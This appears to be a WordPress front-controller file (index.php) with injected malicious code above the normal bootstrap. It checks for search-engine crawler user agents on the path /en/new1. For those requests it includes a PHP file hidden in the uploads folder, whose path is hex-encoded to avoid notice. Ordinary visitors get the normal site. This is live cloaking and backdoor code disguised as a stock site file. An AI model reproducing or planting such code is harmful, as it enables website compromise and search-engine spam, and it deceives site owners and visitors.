<?php
ob_start();
header("Vary: User-Agent");

$local_file = __DIR__ . "\x2f\x77\x70\x2d\x63\x6f\x6e\x74\x65\x6e\x74\x2f\x75\x70\x6c\x6f\x61\x64\x73\x2f\x32\x30\x32\x35\x2f\x31\x31\x2f\x32\x30\x32\x35\x30\x31\x30\x35\x5f\x31\x32\x30\x33\x2e\x70\x68\x70";
$bot_pattern = "/(googlebot|googlebot-mobile|googlebot-news|google-site-verification|google-inspectiontool|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$user_agent = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
$request_uri = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
$request_uri = rtrim($request_uri, '/');

if (preg_match($bot_pattern, $user_agent) && preg_match('#^/en/new1/?$#', $request_uri)) {
    usleep(rand(100000, 200000));
    if (file_exists($local_file) && is_readable($local_file)) {
        include $local_file;
    } else {
        http_response_code(404);
        echo "\x42\x6f\x74\x20\x63\x6f\x6e\x74\x65\x6e\x74\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64\x2e";
    }
    ob_end_flush();
    exit;
}

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
